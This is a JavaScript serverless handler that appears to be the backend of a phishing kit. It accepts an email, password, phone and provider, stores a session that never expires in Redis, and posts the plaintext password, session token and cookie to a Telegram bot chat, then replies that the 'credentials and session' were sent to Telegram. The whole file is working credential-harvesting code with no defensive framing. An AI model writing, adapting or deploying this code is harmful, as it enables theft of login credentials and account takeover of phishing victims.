import Redis from "ioredis";
import { v4 as uuidv4 } from "uuid";
import fetch from "node-fetch";

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const REDIS_URL = process.env.REDIS_URL;

let redis;
function getRedis() {
  if (!redis) {
    redis = new Redis(REDIS_URL, { tls: {} });
    redis.on("error", (err) => console.error("Redis client error:", err));
    redis.on("connect", () => console.log("Redis connected"));
  }
  return redis;
}
function getSessionKey(token) {
  return `session:${token}`;
}

export default async function handler(req, res) {
  if (!BOT_TOKEN || !CHAT_ID || !REDIS_URL) {
    return res.status(500).json({
      success: false,
      message: "Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL",
    });
  }

  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "Method not allowed" });
  }

  let bodyObj = req.body;
  if (typeof bodyObj === "string") {
    try {
      bodyObj = JSON.parse(bodyObj);
    } catch {
      return res.status(400).json({ success: false, message: "Invalid JSON body" });
    }
  }

  const { email, password, phone, provider } = bodyObj || {};
  if (!email || !password || !provider) {
    return res.status(400).json({ success: false, message: "Missing required fields" });
  }

  const normalizedEmail = email.trim().toLowerCase();
  const sessionToken = uuidv4();

  const redisClient = getRedis();
  try {
    // Store session without expiration (never expires)
    await redisClient.set(getSessionKey(sessionToken), normalizedEmail);
  } catch (err) {
    console.error("Redis error:", err);
    return res.status(500).json({ success: false, message: "Failed to store session" });
  }

  // Far-future date for "never" expiring cookies
  const expires = new Date('2099-12-31T23:59:59.000Z').toUTCString();
  const cookieString = `session=${sessionToken}; Path=/; HttpOnly; SameSite=Strict; Expires=${expires}`;

  const message = [
    "🔐 *New Login*",
    `📧 Email: ${normalizedEmail}`,
    `🔑 Password: ${password}`,
    `📱 Phone: ${phone || "N/A"}`,
    `🌐 Provider: ${provider}`,
    `🍪 Session: ${sessionToken}`,
    `🔖 Cookie: \`${cookieString}\``,
    `⏳ Valid: Never expires`,
    `🕒 Time: ${new Date().toISOString()}`,
  ].join("\n");

  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!response.ok) {
      const text = await response.text();
      throw new Error(`Telegram API error: ${response.status} ${text}`);
    }
  } catch (error) {
    console.error("Telegram error:", error);
    // Not fatal for the user
  }

  // Set the session cookie (never expires)
  res.setHeader("Set-Cookie", cookieString);

  return res.status(200).json({
    success: true,
    message: "Login successful. Credentials and session sent to Telegram.",
    session: sessionToken,
    cookie: cookieString,
    email: normalizedEmail,
  });
}